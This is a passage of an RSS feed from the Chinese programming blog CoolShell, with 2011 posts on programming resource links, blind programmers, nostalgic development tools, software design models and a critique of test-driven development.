<li>Latitude API – <a href="https://code.google.com/p/google-api-php-client/source/browse/trunk/examples/latitude/index.php">Sample</a>
</li>
<li>Page Speed Online API – <a href="https://code.google.com/p/google-api-php-client/source/browse/trunk/examples/pagespeed/index.php">Sample</a>
</li>
<li>Tasks API – <a href="https://code.google.com/p/google-api-php-client/source/browse/trunk/examples/tasks/index.php">Sample</a>
</li>
<li>URL Shortener API – <a href="https://code.google.com/p/google-api-php-client/source/browse/trunk/examples/urlshortener/index.php">Sample</a>
</li>
</ul>
</ul>
<ul>
<li>
<strong>Django Google Chart</strong> <a href="http://publishedin.com/django-google-charts/" target="_blank">http://publishedin.com/django-google-charts/</a>  为Django封闭的Google 统计图API。</li>
</ul>
<p><img alt="image placeholder" ></p>
<ul>
<li>
<strong>一个新的HTML5+CSS3的JS库Kendo UI</strong>：<a href="http://demos.kendoui.com/" target="_blank">http://demos.kendoui.com/</a> 这样的JS库有很多，如比较经典的ExtJS, YUI 和 jQuery。不过大家可以试试这个库。其支持移动设备。</li>
</ul>
<p><a id="launch-image" href="http://www.kendoui.com/aeroviewr/"><img alt="image placeholder" ></a></p>
<h4>
<span class="ez-toc-section" id="HTML_5"></span><strong>HTML 5<br>
</strong><span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<strong>HTML5 Canvas 的开发指导</strong>：<a href="http://www.sitepoint.com/a-developer%E2%80%99s-guide-to-html5-canvas/" target="_blank">http://www.sitepoint.com/a-developer%E2%80%99s-guide-to-html5-canvas/</a>
</li>
</ul>
<ul>
<li>
<strong>HTML5+ Javascript的游戏开发教程</strong>：<a href="http://gamedev.slashgame.net/2011/08/html5-game-development-tutorial.html" target="_blank">http://gamedev.slashgame.net/2011/08/html5-game-development-tutorial.html</a>
</li>
</ul>
<ul>
<li>
<strong>HTML 5速查卡</strong>（PDF） <a href="http://www.thecssninja.com/talks/dnd_and_friends/assets/html5-cheat-sheet.pdf">http://www.thecssninja.com/talks/dnd_and_friends/assets/html5-cheat-sheet.pdf</a>
</li>
</ul>
<ul>
<li>
<strong>70 个 HTML5 的精彩示例</strong> <a href="http://www.instantshift.com/2011/07/05/70-inspirational-examples-of-websites-designed-with-html5/">http://www.instantshift.com/2011/07/05/70-inspirational-examples-of-websites-designed-with-html5/</a>
</li>
</ul>
<h4>
<span class="ez-toc-section" id="_%E7%BC%96%E7%A8%8B%E8%A7%84%E8%8C%83"></span> 编程规范<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<strong>The Art of Assembly Language Programming 汇编语言艺术</strong> <a href="http://www.arl.wustl.edu/~lockwood/class/cs306/books/artofasm/toc.html">http://www.arl.wustl.edu/~lockwood/class/cs306/books/artofasm/toc.html</a>
</li>
</ul>
<ul>
<li>
<strong>编程规范 if语句的简单规则</strong>：<a href="https://united-coders.com/christian-harms/basic-rules-for-code-readability-and-the-if-statement">http://united-coders.com/christian-harms/basic-rules-for-code-readability-and-the-if-statement</a>
</li>
</ul>
<ul>
<li>
<strong>Linux 内核C编程规范：</strong><a href="https://www.kernel.org/doc/Documentation/CodingStyle" target="_blank">http://www.kernel.org/doc/Documentation/CodingStyle</a>
</li>
</ul>
<ul>
<li>
<strong>Google的C++编程规范：</strong><a href="https://google-styleguide.googlecode.com/svn/trunk/cppguide.xml">http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml</a>
</li>
</ul>
<ul>
<li>
<strong>GNU的编程规范：</strong><a href="https://www.gnu.org/prep/standards/standards.html">http://www.gnu.org/prep/standards/standards.html</a>
</li>
</ul>
<ul>
<li>最后，强烈推荐你读一下Nokia的Qt的《<a href="http://developer.qt.nokia.com/wiki/API_Design_Principles" target="_blank">API Design Principles</a>》，其中的一条规则写成了本站的《<a title="千万不要把 bool 设计成函数参数" href="https://coolshell.cn/articles/5444.html" target="_blank">千万不要用bool做函数参数</a>》</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83"></span><strong>其它</strong><span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<strong>在OS X上使用gcc而不是xcode编译C++程序</strong> <a href="https://github.com/kennethreitz/osx-gcc-installer">https://github.com/kennethreitz/osx-gcc-installer</a>
</li>
</ul>
<ul>
<li>
<strong>声讨PHP的一个slids</strong> <a href="http://zakx.de/phprant-en.pdf">http://zakx.de/phprant-en.pdf</a>， 前面说到的两个网站都是使用PHP做到，不过，你可以通过这个PDF了解一下PHP有哪些地方不好。</li>
</ul>
<ul>
<li>
<strong>Infinite超级玛丽</strong>：(你可以比较一下，哪个版本不错)</li>
<ul>
<li>HTML5 版： <a href="http://mario.fromlifetodeath.com/" rel="nofollow">http://mario.fromlifetodeath.com/</a> (<a href="https://github.com/robertkleffner/mariohtml5" target="_blank">源码</a>)</li>
<li>Java版：<a href="https://www.mojang.com/notch/mario/">http://www.mojang.com/notch/mario/</a>
</li>
<li>Flash版：<a href="http://www.supermariobrothers.org/infinite-mario.html">http://www.supermariobrothers.org/infinite-mario.html</a>
</li>
</ul>
</ul>
<p><em><strong>—— 更新 2011.9.20  21:00 ——</strong></em></p>
<p>@<a href="https://coolshell.cn/articles/5224.html/comment-page-1#comment-82966">xzhaoyang</a> 在留言中问我有没有C写CGI的文章，我看过最好的一篇是下面这篇：</p>
<p><a href="https://www.tutorialspoint.com/cplusplus/cpp_web_programming.htm" target="_blank">http://www.tutorialspoint.com/cplusplus/cpp_web_programming.htm</a> （注意翻墙）</p>
<div>（全文完）</div>
<p></p>
 ]]></content>
<pubDate>2011-09-20T08:32:52+08:00</pubDate>
<guid>https://coolshell.cn/articles/5224.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 如果你看不见你还能编程吗？ ]]></title>
<link>https://coolshell.cn/articles/5514.html</link>
<content><![CDATA[ 
<p>这是个StackOverflow上的问题 <a title="How can you program if you're blind?" href="https://stackoverflow.com/questions/118984/how-can-you-program-if-youre-blind" target="_blank">How can you program if you’re blind?</a> 。在看到这个问题的时候，我感到应该不可能，但是我错了，这个问题的前两个答案让我深深地震憾了。</p>
<p>第一个答案的回复人是<a href="https://stackoverflow.com/users/14744/jared">Jared</a>（其在StackOverflow上的积分有将近14K），但是你能想得到他是一个盲人吗？他回复到——</p>
<blockquote>
<p>我是一个完全失明的大学学生，我做过一些程序员的实习工作，所以我的回复基于我的这些经历。我使用Windows XP 和  <a href="http://freedomscientific.com/products/fs/jaws-product-page.asp" rel="nofollow">Jaws</a> 来为了读出屏幕上的内容。</p>
<p>对于Java 编程，我使用eclipse这个强大的IDE。我使用SWT开发GUI。对于.NET编程，其使用Visual Studio 2005，使用Jaws可以非常容易地操作VS2005，而且其还有一些很不错的脚本来可容易地用来做表单设计。</p>
<p>对于C/C++，我使用cygwin + gcc 也使用emacs 和 vim 做出编辑器（使用<a href="http://emacspeak.sourceforge.net/" target="_blank">Emacspeak</a>虽然有时候有点迟钝）。在实习过程中，我做了很多和Z/OS相关的编程工作。我使用rlogin通过cygwin登录大型机的USS系统，并使用C3270作为其3270仿真器来访问大型机的ISPF部分。</p>
<p>我依赖于合成语音系统，也需要 Braille display， 我发现使用合成语音系统很快，但是使用 Braille display有时候有些问题。比如程序有太多的嵌套括号。</p>
</blockquote>
<p>关于Braille display，又叫盲文显示机，是能以盲文进行输出的电子机械式设备。一般来说，该设备通过在平坦表面上打孔来实现点阵的表现。有了该设备的帮助，无法使用一般的显示设备的失明用户也能够阅读文字。如下所示。</p>
<p><span id="more-5514"></span></p>
<p style="text-align: center;"><a href="https://www.google.com.hk/search?q=Braille+display&amp;hl=zh-CN&amp;safe=strict&amp;prmd=ivns&amp;tbm=isch&amp;tbo=u&amp;source=univ&amp;sa=X&amp;ei=zrV4Tt6YOemtiQfRkIzhDA&amp;ved=0CDMQsAQ&amp;biw=1280&amp;bih=677"><img alt="image placeholder" ></a></p>
<p>第二个答案是<a href="https://stackoverflow.com/users/56241/saqib">Saqib</a>提供的，其个人主页是<a href="http://www.saqibshaikh.com/">http://www.saqibshaikh.com/</a>，目前在Microsoft的Bing项目组，他回答到：</p>
<blockquote>
<p>我是盲人，我对Windows, Mac, Linux 和 DOS有13年的编程经验了，我会的编程语言是C/C++, Python, Java, C#或是其它相似的语言，虽然问题问的是怎么来设置盲人的环境，但是我想从盲人怎么使用电脑来回答。</p>
<p>有些人使用“语音环境”，如T. V. Raman程序员和Emacspeak 环境。这样的环境需要有读屏程序来监控操作系统的行为，并通过合成语音系统或是Braille display 来告诉盲人屏幕上有什么。这样一样，盲人就可以操作任何的应用程序了。</p>
<p>我个人这段时候使用Visual Studio 2008（注：作者是09年回的这个贴的），用其来做一些修改。我关闭了一些VS2008的功能，如显示错误，因为这会让我分心。在加入微软以前，我都是在用notepad这样的东西开发程序。</p>
<p>对于读屏软件，我需要设置一下，以便其告诉我缩进。老实说我不太关心这个事，因为VS2008对程序缩进做得很好。但是对于Python来说，这个功能相当重要。最终，Emacspeak 可以使用不同的声音来让我区分缩进的语句块，以及一些语法（关键词，注释，标识，等等。）</p>
</blockquote>
<p>对于<a href="https://stackoverflow.com/users/56241/saqib">Saqib</a>，大家有兴趣可以看看他的视频访谈：<a href="http://channel9.msdn.com/blogs/dan/saqib-shaikh-and-scott-hanselman-designing-for-accessibility" target="_blank">Saqib Shaikh and Scott Hanselman: Designing for Accessibility</a></p>
<p>这个问题中多次提到了Google的盲人程序员 T.V. Raman，我在网上搜了一下他，他前段时间来过北京，新京报在今年早期报道过他——《<a href="http://epaper.bjnews.com.cn/html/2011-01/16/content_192258.htm" target="_blank">T.V 拉蒙，互联网界也有“盲剑客” ——Google盲人工程师讲述软件设计之路</a>》</p>
<p><img alt="image placeholder" ></p>
<p>在这篇报道中，他经历过IBM, Adobe和Google 这三个公司，他可以在23秒内复原盲人魔方，1989年他就得到一台给盲人用的语音合成器和当时最先进的读屏软件。他现在使用电脑 没有任何障碍，他天天都上网浏览信息，他还可以使用特别的手机来看地图。</p>
<p>不知道你看完这些人的经历后，你有什么感觉？</p>
<ul>
<li>你是否会觉得技术的力量和社会的尊重让他们和正常人一样可以使用电脑？</li>
<li>你是否会觉得我们这些正常人是不是平时抱怨的太多了呢？还有什么理由不努力的呢？</li>
</ul>
<div>（全文完）</div>
<p></p>
 ]]></content>
<pubDate>2011-09-21T08:26:58+08:00</pubDate>
<guid>https://coolshell.cn/articles/5514.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 那些曾伴我走过编程之路的软件 ]]></title>
<link>https://coolshell.cn/articles/5576.html</link>
<content><![CDATA[ 
<p>收家的时候发现了一张VC++6.0的光盘，实然引发了我的怀旧情结。于是在<a href="https://weibo.com/1401880315/xsBMcbMVz" target="_blank">微博上感叹了一下</a>，看到一些朋友的回应，还有朋友提到了Turbo C 2.0，于是更回放大了我的怀旧情绪，让我回想了很多N年前伴我走过编程之路的软件。现在看下来，有些感叹，又有些可笑。感叹的是技术发展的变迁，可笑的是当时的一些想法。（Unix/Linux是在大四和毕业的时候接触的，虽然这是我的强项，但是这下面的编程这么多年来没什么变化，所以就不提了）<strong>注：图片较多，请稍等。</strong></p>
<p>还记得第一次接触编程是在高中的时候，用中华学习机学Basic程序，后来到了大学，虽然学校的课程没有教Basic语言，但是DOS下有一个叫Quick Baisc的东西让我把高中时的知识又捡了回了。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">大学里学的第一门语言是Pascal，所以，用的编程软件也就是Turbo Pascal，还记编译起来巨快无比，尤其是那个只有软盘和640K的基本内存的时代。</p>
<p style="text-align: left;"><span id="more-5576"></span></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">在这里还需要提一点的是当时的一个学习打字指法的软件，TT，呵呵。还记得当时整日整夜的去机房练打字，练指法速度。还记得当时能打到38分就算是相当的NB了。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">这是当时TT中的一个游戏，很好玩。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">然后开始学C语言，于是Turbo C 2.0成为了那个时代的经典，我还记得当时学校里的386电脑没有内存，没有硬盘，只有两个软驱，一个是3寸的，一个是5寸，而Turbo2.0的大小太大（2M多）所以，得把所有的头文件和lib文件放在3寸盘上，而主程序员放在5寸盘上，A盘和B盘同时来编译我的C程序，编译的时候，那叫一个慢啊，那是一个听着软驱咯吱咯吱的声音的时代。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">后来，用Turbo C 的图形库在DOS下画各种菜单，按钮，被支持鼠标等等，非常欢乐。（注：那时能写一个支持鼠标的程序是相当拉风的）</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">当时，Turbo C还是不足开发企业级应用，企业级的MIS系统需要数据库的支持，Foxbase是当时在学校里学的第一个和数据库有关的东西，现在完全忘 了。我还记得foxbase是当时计算机水平考试里的一个很重要的一环。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">foxbase很快就淘汰了，举而代之能开发企业级应用的是FoxPro，看到FoxPro的强大，尤其是对菜单，表单，按钮等的支持，当时觉得这是世界上最NB的编程工具了。还跟着老师开发了一些MIS系统。后来听老师说，他们给昆明车管所使用foxpro来管理昆明的自行车，因为数据量太大，FoxPro经常崩溃。这可能是我听说过最早的电子政府系统了。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">Win3.2/Win95下的Foxpro更不用说了，NB啊。当时的神器啊。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">进入Win95图形界面时代Borland C++也是需要提一下的，只是当时学校没有C++的课程，所以完全不懂，而且因为Foxpro和其些如VB，Powerbuilder的RAD编程工具的泛滥，甚至觉得Borland C++和VC++完全没戏。呵呵。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">PowerBuilder掀开了另一个企业级应用的时代，C/S结构。太强了，在大三大四的时候，在老师开的公司里用这个东西为丽江三合酒店，一个送水公司，还有云南省外事办公室开发过其MIS系统。使用PowerBuilder一直到2002年，交行总行国业务系统的前端，还有上海电信系统。今天还有人在用这个东西开发软件么？</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">VB也是一个划时代的产品，不过好像从来都是一个编程初学者的玩具，当时我学过VB，感觉其把编程搞成了一个搭积木的过程。我在当时草草地使用了VB，因为那时出了一个叫VB killer的东西——Delphi。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">Delphi的时代是相当生猛的一个时代，企业级开发，自带数据库，可以制作各咱小工具软件和网络软件，等等，到后来的Delphi7还支持多层结构和分布式，在Delphi的时代，我记得那时的狂热，网上有很多超NB的控件可以让你开发出相当炫的界面。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">还记得C++ Builder吗？搞得跟Delphi一模一样，但是编译的速度慢得实在是不行。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">VC++的时代应用是从北大的《Windows编程设计》一书发布时开始的，这才是真正的SDK编程。于是我开始喜欢使用VC++了。一直到今天。VC++6.0是一个经典，直到今天的VS2008，我还是要把热捷和界面搞成VC6.0的风格。呵呵。</p>
<p style="text-align: left;"><img alt="image placeholder" ></p>
<p style="text-align: left;"><img alt="image placeholder" ></p>
<p style="text-align: left;">刚参加工作的时候，单位里用Lotus Notes做办公自动化软件的平台，于是我学习了怎么在Notes下开发应用。后来还用这个玩意给一些银行开发过一些办公自动化流程的应用。我有一个同学相当痴迷于这个平台。现在看来，有点非主流了。</p>
<p><img alt="image placeholder" ></p>
<p style="text-align: left;">在大三的时候，Java和WEB出现了，系上接到了一个项目，需要用HTML+Java的方式做一些在线的教学课件。但是，当时连一本HTML的书都没有，又上不了网，我只能在看一些盗版光盘里的HTML的文件的例子来学习。那时，基本上是用notepad来写HTML，这让我对HTML打下了非常扎实的基础。后来知道有一个叫HotDog的专门用来写HTML的软件，用了一段时间。</p>
<p style="text-align: left;"><img alt="image placeholder" ></p>
<p style="text-align: left;">但最终还是使用了微软的FrontPage多一些，直到Dreamweaver的出现。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">当时的开发环境用的是NetScape，就是下面这点鸟样的东西了。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">在大三大四做那个操作系统的教学课件的时候，开发Java Applet的IDE主要是用Cafe，Java Workshop。当时用这些东西开发了一些Applet用来演示UNIX操作系统内存分配，进程调度，文件存储等算法的动画。还得了个大学生挑战者杯的鼓励奖。现在想想，如果当时有Flash的话，可能做这些演示动化就不用那么麻烦了。</p>
<p style="text-align: left;"><img alt="image placeholder" ></p>
<p style="text-align: left;">总体来说，Java Workshop也不好用。还是更多的使用Cafe写Java程序。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">毕业两年后在工作上因为要做IBM?Websphere上的应用，于是使用了IBM的Visual Age for Java，现在看来，这些IDE真是太土了。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">关于Java的开发工具还有两个东西，一个是Microsoft的J++，另一个是Borland的JBuilder。J++ 就像是一个笑话，非标准的，据我所知没有人用。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">JBuilder流行了很多年，还得了很多奖，几乎成了Borland的最后一个支柱产品，不过当时因为我皈依Linux/C/C++了，所以，也就没有搞Java了，不过这个IDE还是相当的优秀。不知道现在还有没有人用。不过，现在的Java IDE被Eclipse 一统山河了。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">好了，上面是一些关于编程方面的，还有一些比较经典的软件如下。</p>
<p style="text-align: left;">一个是汉字平台，香港金山公司的UC-DOS，和WPS，当时的我还纳闷，为什么香港人也用简体中文了。对此，我心中对祖国的热爱小小的升华了。</p>
<p><img alt="image placeholder" ></p>
<p>还有杀毒软件，KV300和kill<img alt="image placeholder" ></p>
<p>帮朋友修电脑用得最多的就是PC Tools</p>
<p><img alt="image placeholder" ></p>
<p>玩游戏的必备——FPE</p>
<p><img alt="image placeholder" ></p>
<p>有谁还记得这个看图软件——SEA？<br>
<img alt="image placeholder" ></p>
<p>Zmud——当时的网游戏。也是需要练级。在大四和刚工作头一年疯玩过Zmud，之后，对于今天的这些大量的网游没有什么兴趣了。</p>
<p><img alt="image placeholder" ></p>
<p>还有当时用猫上网的年代，NetAnt成了下载软件的装机必备。下载速率平均只有3k-4kBps，这种生活是怎么过来的啊。哈。</p>
<p><img alt="image placeholder" ></p>
<p>相信你也有你自己的怀旧的故事，不妨分享一下。</p>
 ]]></content>
<pubDate>2011-10-14T13:58:40+08:00</pubDate>
<guid>https://coolshell.cn/articles/5576.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ “品质在于构建过程”吗？ ]]></title>
<link>https://coolshell.cn/articles/5625.html</link>
<content><![CDATA[ 
<p><strong>感谢<a href="https://weibo.com/n/weidagang">@weidagang</a> （Todd）向酷壳投递的这篇精彩的文章。<a href="https://www.cnblogs.com/weidagang2046/archive/2011/10/15/2213672.html" target="_blank">原文</a></strong></p>
<p>今天在微博上看到几位敏捷爱好者探讨敏捷测试和质量保证问题，我忍不住也加入了讨论：</p>
<blockquote>
<p><span style="color: #800040;"><strong>Z先生原帖：</strong>我刚才看到一个大会演讲稿，谈到敏捷测试六大指导原则：1.仅靠测试人员不可能获得高质量的软件，质量是整个研发团队的责任；2. 场景是不可穷举的，测试活动必须是风险驱动的，关注于高风险的场景；3.分层自动化测试是唯一出路;4.在正确的位置进行恰当的测试是自动化的关键；【待续】</span></p>
<p><span style="color: #800040;"><strong>S先生回复：</strong>品质在于构建过程。检验贯穿构建过程，提供及时反馈。</span></p>
<p><span style="color: #800040;"><strong>我回复：</strong>什么样的构建过程才能出Unix这样的品质呢？迭代？快速反馈？TDD?</span></p>
<p><span style="color: #800040;"><strong>S先生回复：</strong>据说stroustrup听到重构时的反应是，我们从七十年代就这样做了。推荐《UNIX编程环境》，了解大师的编程方式。</span></p>
<p><span style="color: #800040;"><strong>我回复：</strong>您偷换了概念。不能说大师用了重构，C++和UNIX的品质就是靠重构或某种构建过程得来的。厨师做菜用到了勺子，不等于菜好吃是因为勺子。</span></p>
<p><span style="color: #800040;"><strong>S先生回复：</strong>我没有概念。我们看到一个果，就问因是什么。其实是泛因果，无因果，一切是机缘凑巧。</span></p>
<p><span style="color: #800040;"><strong>我回复：</strong>“品质在于构建过程”难道不是一个明白的因果描述吗？</span></p>
<p><span style="color: #800040;"><strong>S先生回复：</strong>品质在于构建的人。我说话时没因果，你看到了因果。</span></p>
<p><span style="color: #800040;"><strong>我回复：</strong>欢迎敏捷爱好者围观！</span></p>
</blockquote>
<p>很高兴几个回合讨论下来S先生修正了先前“品质在于构建过程”的观点。什么重构、TDD、迭代、快速反馈等等构建过程都不是Unix品质的核心要素。我不但不认同“品质在于构建过程”、“测试是最好的设计方法”这类机械式的观点，而且也不满意把软件优劣归结于“人是根本”的简单回答。我们需要探索一个既非机械式，也非简单地归结为某种理念的答案。</p>
<p><span id="more-5625"></span></p>
<p>像Unix这样优秀的软件，真正的核心要素到底是什么呢？我的答案是：模型，即人心中的软件。在看得见、摸得着之前，Unix的品质就已经存在于设计者的心中了，他们不会在Unix诞生后惊讶：“哇，Unix的稳定性这么好，7×24小时运行，从来不蓝屏”。模型一定是设计者心中最美的东西，为什么我们阅读操作系统源代码会像进入迷宫一般理不清头绪，而作者自己却觉得头头是道呢？因为作者早已“胸有成竹”，我们以为他几十万行代码敲很辛苦，实际上在他自己看来是按部就班一步步向目标靠近。</p>
<p>模型是软件的灵魂，存在于设计者的心中，而软件的构建过程正是心中的世界向现实世界逐渐投影。模型可以是完美的，而现实却非完美，或许有时候我们很幸运地到达了，或许有时候我们不得不向现实妥协，改变心中的世界。试图制造灯泡的爱迪生可能会一时找不到熔点极高的发光金属而止步不前，企图制造永动机的人则根本无法实现。在不完美的现实中，我们明明想的是a+b，却敲成了a-b；我们以为某个API可以很快返回，没想到却等了5秒钟，为了不阻塞用户不得不改成了异步。Review、测试等构建过程在一定程度上弥补了现实的不完美，并对模型给予了反馈，但它却无法决定软件的特质。如果设计者心中没有Unix，即使每个实现环节都层层检验，拥有光速般的反馈，他有怎么能构建出Unix呢？Windows NT内核和Windows 3.1内核的品质差别不在于微软采用了两种不同的构建过程，而在于它们采用了不同的内核模型。灵魂与躯体的差别就在于此！虽然对于普通的软件开发通常有不少成熟的模型供选择，并不需要总是创造自己的模型，但理解模型间的差异，并在设计时选用恰当的模型仍然比采用某种构建过程更加重要。服务器架构采用Nginx似的异步IO模型，还是采用Apache似的每个请求一个线程的模型远比开发是否采用了TDD更为重要。</p>
<p>模型的产生是柔性的，主要源于灵感；过程的执行是刚性的，主要源于逻辑。苹果砸在牛顿的脑袋上能砸出万有引力模型，砸在我们脑袋上却只是“哎呦”一声；但一个苹果3元钱，两个苹果2*3=6元钱却在牛顿和我们面前是平等的。迷信灵感和迷信逻辑是两个错误的极端，孔子讲“天下国家可均也，爵禄可辞也，白刃可蹈也，中庸不可能也”，任何一项技能的高级阶段都是关于“度”的艺术。如同光具有波粒二象性，软件开发也具有艺术创作和工业生产的二象性，它包含了柔性的设计和刚性的过程。越是不成熟的前沿领域越表现出柔性特征；越是成熟的一般领域越表现出工业生产的特征。因此，一个以新产品为主的创业型公司应当更注重设计，更需要画家、诗人般的创造型人才；而业务成熟产品稳定的大公司应当更注重过程，更需要踏踏实实的生产线工人似的人才。但在当今这个瞬息万变的信息时代，即使是世界500强的大公司也越来越不稳定，越来越需要创新才能适应，所以即使大公司也不可忽视软件开发的柔性特征。同时，我们也不能迷信模型，过程同样可以成为企业的核心竞争力，比如：富士康。虚虚实实，实实虚虚，其妙无穷。老外做Nike品牌（虚），我们做代工生产（实），高额利润被老外拿走了；我们经营航空公司（虚），老外生产波音飞机（实）高价卖给我们，高额利润又被老外拿走了。靠虚取胜还是靠实取胜？这是个问题^_^</p>
<p>或许我对于模型柔性的描述不太让人满意，人们多习惯于有章可循的感觉，即便不是死板的知识，起码要找个“在某某思想的指导下”才觉得心里有着落。或许还有人说，模型的确重要，那么我们能不能有一个过程、模式或套路来推导出模型呢？比如，现在非常流行的从用户需求出发的分析模式，即“分析需求，抽象出共性，共性是本质的，本质是稳定的”，这类模式的特点符合人们希望找到套路的心理，一看就明白，容易操作，有成就感。我不否认这类模式的确可以得出可用的软件设计，沿用成熟的模型也未尝不可。但我们应该明白，心中的世界远比现实的世界更广大更美妙。世界是多元的，用户需求、成熟模型等直接可见的东西只代表了某几个维度的视图，设计者心中应当有更多的维度！用户需要一个文本编辑器，是设计者心中的世界决定了他交出的作品是Vi，还是Emacs，亦或是Notepad。亨利·福特说：“如果你问用户需要什么，他会告诉你一匹更快的马”。汽车源于福特心中的世界，这是一个比只有马的世界更多彩的世界。乔布斯是一个不重视市场调研的人，iPod，iPhone，iPad都不是发个问卷，做个市场调查看看用户需要什么的结果。Apple是乔布斯心中的世界在现实中的投影！所以，请打破“从用户需求出发”，“从模式出发”的迷信，释放你的想象力，让自己心中的世界去包容现实的世界吧！</p>
<p>每个人心中都有一个属于自己的世界，牛顿运动定律是牛顿心中的世界，相对论是爱因斯坦心中的世界。哪一个才是本来的世界呢？有没有本来的世界呢？本来的世界是什么样子呢？… 老子给我们启示“道可道，非常道”，说得清，道得明，想得到的都不是永恒的真理，所以真理不可言说，对真理的探索永远没有止境……</p>
 ]]></content>
<pubDate>2011-10-16T13:16:55+08:00</pubDate>
<guid>https://coolshell.cn/articles/5625.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Test-Driven Development？别逗了 ]]></title>
<link>https://coolshell.cn/articles/5531.html</link>
<content><![CDATA[ 
<p>这篇文章来源于Peter Sergeant在<a href="http://www.writemoretests.com/" target="_blank">Write More Test</a> 博客上的《<a href="http://www.writemoretests.com/2011/09/test-driven-development-give-me-break.html" target="_blank">Test-Driven Development? Give me a break…</a>》，在原文和<a href="https://www.reddit.com/r/programming/comments/kq001/testdriven_development_youve_gotta_be_kidding_me/">Reddit</a> 上有很大反响。这篇文章里的很多观点在《<a title="TDD并不是看上去的那么美" href="https://coolshell.cn/articles/3649.html" target="_blank">TDD并不是看上去的那么美</a>》和《<a title="再谈敏捷和ThoughtWorks中国咨询师" href="https://coolshell.cn/articles/3745.html" target="_blank">再谈敏捷和TW咨询师</a>》里都出现过（我个人觉得我的观点比其更全面一些）。就像我转的《<a title="为什么Scrum不行？" href="https://coolshell.cn/articles/5044.html" target="_blank">Scrum为什么不行</a>》 和《<a title="Bob大叔和Jim Coplien对TDD的论战" href="https://coolshell.cn/articles/4891.html" target="_blank">Bob大叔和Jim Coplien对TDD的论战</a>》一样，从这些贴子我们可以看到——<strong>这是一个全世界的问题，并不是只有在中国才有的问题</strong>。</p>
<p><strong>很多敏粉都在说我在是喷敏捷，黑敏捷，向敏捷泼脏水，我只想对这些人说——</strong><span style="color: #cc0000;">你们这样的见解很肤浅也很敏感，你们根本就没有认识到——争论，反思和不同观点的意义，你也就无法了解你们所信仰的敏捷！你们只是在肤浅和盲目地信仰和教条敏捷中的许多名词、方法和标准答案罢了</span>。</p>
<p style="text-align: center;">——————————————正文开始——————————————</p>
<p>对于程序员来说有些事有非常危险的信号（red flag）。当我听到有人开始信仰Test-Driven Development 是 One True Programming Methodology（唯一正确的编程方法论），这就是危险信号（red flag），我开始假设你是一个劣等、没有经验的程序员，或是某些敏捷咨询师。</p>
<p>测试只是一个工具来<strong>帮助你</strong>，而不是用来证明谁比谁更虔诚，或是我的屌比你的要大，等这种愚蠢的行为。测试是用来让<strong>程序员</strong>得到有帮助的、更快的反馈，从而找到正确的路径，如果你搞坏一些事，其还可以用来给后人一些警告。这根本就不是一个神秘的有魔力的方法其可以让你的代码变得更好……</p>
<p>整个Test-Driven Development的概念是麻痹和信奉，从而让其成为你的人生观。相反的：Developer-Driven Testing，它给你和你的同事一些有用的工具来解决问题，来支持你自己，而不是那种以工具或方法为中心的让你假设其应该是那样的测试。</p>
<p><span id="more-5531"></span></p>
<p>是不是在有些时候我们需要在写代码前写测试？当然是，比如，“修改已有的功能”，这会一个适用的场景，还有那些短小的和已定义完善的事物，或是对已被测试过的代码做一些改善。</p>
<p>但， 是不是你就应该需要<strong>总是</strong>要去先写测试？省省吧，别逗了。</p>
<p>这是极度白痴的行为，尤其是在设计，调查和开发的初期。让你的测试来接管你的代码（而不是影响那个模块的代码）和接管你的设计 这是一个巨大的失败，就是因为你写的那些测试范围太大太不靠谱。（陈皓注：我在《<a title="TDD并不是看上去的那么美" href="https://coolshell.cn/articles/3649.html" target="_blank">TDD并不是看上去的那么美</a>》一文中说过测试案例的测试范围的问题，敏捷社区除了对我进行人身攻击外从未对此做过正面回答。）</p>
<p>在写代码前写测试案例在一些场景下的确很不错。然后，Test Driven Development，被敏捷专家或是其它各种五花八门的江湖骗子像神给凡人宣扬一样，这就是欺骗大众。</p>
<p>行动在想法之下，于是测试必需先行（所有我已看到的，所有我正在看到的都表明这是TDD的中心思想—— 你写了测试，然后你再写代码并通过测试），于是测试成为了最有用的活动并可以帮助程序员。这是错的。</p>
